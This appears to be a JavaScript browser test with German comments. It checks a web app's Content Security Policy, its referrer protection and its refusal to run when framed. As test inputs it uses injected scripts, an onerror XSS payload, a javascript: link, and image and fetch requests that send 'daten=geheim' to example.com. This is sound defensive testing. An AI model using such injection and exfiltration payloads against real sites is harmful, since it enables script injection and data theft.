// Testet die Schutzmechanismen gegen Angriffe (wie in Wortnest): Sicherheitsregel (CSP) blockiert eingeschleusten und fremden Code,
// nichts geht an fremde Adressen, die App läuft nicht eingebettet in fremden Seiten, Links verraten keine Herkunft.
(async function () {
  const fehler = [];
  const pruefe = (b, t) => { if (!b) fehler.push(t); };
  const pause = (ms) => new Promise((r) => setTimeout(r, ms));
  await startFertig;
  const verstoesse = [];
  document.addEventListener('securitypolicyviolation', (e) => verstoesse.push(e.violatedDirective));

  // 1. Regel vorhanden und streng
  const csp = (document.querySelector('meta[http-equiv="Content-Security-Policy"]') || {}).content || '';
  for (const teil of ["script-src 'self'", "object-src 'none'", "base-uri 'self'", "form-action 'none'", "connect-src 'self' blob: data:"]) {
    pruefe(csp.includes(teil), `Regel fehlt: ${teil}`);
  }
  pruefe(!/unsafe-eval|script-src[^;]*unsafe-inline|https?:/.test(csp), `Regel zu weich: ${csp}`);
  pruefe((document.querySelector('meta[name="referrer"]') || {}).content === 'no-referrer', 'Link-Schutz (Referrer) fehlt');

  // 2. Eingeschleuster Code läuft nicht: eingebettetes Skript, Ereignis-Attribut, javascript:-Link
  const s = document.createElement('script');
  s.textContent = 'window.__angriff1 = 1';
  document.body.appendChild(s);
  const box = document.createElement('div');
  box.innerHTML = '<img src="data:image/png;base64,AAAA" onerror="window.__angriff2 = 1"><a id="boese-link" href="javascript:window.__angriff3=1">x</a>';
  document.body.appendChild(box);
  document.getElementById('boese-link').click();
  await pause(500);
  pruefe(!window.__angriff1, 'Eingebettetes Skript lief');
  pruefe(!window.__angriff2, 'onerror-Attribut lief');
  pruefe(!window.__angriff3, 'javascript:-Link lief');
  // Fremdes Skript wird nicht geladen
  await new Promise((r) => { const f = document.createElement('script'); f.src = 'https://example.com/boese.js'; f.onerror = r; f.onload = r; document.body.appendChild(f); setTimeout(r, 1500); });
  pruefe(!window.__angriff4, 'Fremdes Skript lief');

  // 3. Nichts geht nach außen: Bild, Verbindung
  const img = new Image();
  img.src = 'https://example.com/spion.png?daten=geheim';
  let rausGeschickt = true;
  try { await fetch('https://example.com/?daten=geheim'); } catch { rausGeschickt = false; }
  await pause(300);
  pruefe(!rausGeschickt, 'fetch an fremde Adresse ging durch');
  pruefe(verstoesse.includes('img-src') && verstoesse.includes('connect-src'), `Keine Sperre gemeldet: ${verstoesse}`);
  pruefe(verstoesse.includes('script-src-elem') || verstoesse.includes('script-src'), 'Skript-Sperre nicht gemeldet');
  box.remove();

  // 4. Eigene Fotos gehen weiter (blob:) – z. B. das Foto vom Kind
  const bild = await new Promise((r) => { const c = document.createElement('canvas'); c.width = c.height = 4; c.toBlob(r, 'image/png'); });
  const eigen = await new Promise((r) => { const i = new Image(); i.onload = () => r(true); i.onerror = () => r(false); i.src = URL.createObjectURL(bild); });
  pruefe(eigen, 'Eigenes Foto (blob:) wird blockiert');

  // 5. Eingebettet in eine Seite: App startet nicht, zeigt nur einen Link
  const rahmen = document.createElement('iframe');
  rahmen.src = '/index.html';
  rahmen.style.cssText = 'width:300px;height:200px';
  document.body.appendChild(rahmen);
  await new Promise((r) => { rahmen.onload = r; setTimeout(r, 4000); });
  await pause(500);
  const innen = rahmen.contentDocument;
  pruefe(innen && innen.querySelector('a') && innen.body.textContent.includes('eigenen Fenster') && !innen.querySelector('#home'),
    `Eingebettete App startet: ${innen && innen.body.textContent.slice(0, 60)}`);
  rahmen.remove();

  const d = document.createElement('div');
  d.style.cssText = 'position:fixed;left:0;right:0;bottom:0;color:#fff;font:12px monospace;padding:6px;z-index:9;background:'
    + (fehler.length ? '#c62828' : '#1b7f3a');
  d.textContent = fehler.length ? 'FEHLER: ' + fehler.join(' | ') : 'SICHERHEIT OK';
  document.body.appendChild(d);
})().catch((e) => {
  const d = document.createElement('div');
  d.style.cssText = 'position:fixed;bottom:0;left:0;right:0;background:#c62828;color:#fff;padding:6px;z-index:9';
  d.textContent = `ABSTURZ: ${e}`;
  document.body.appendChild(d);
});
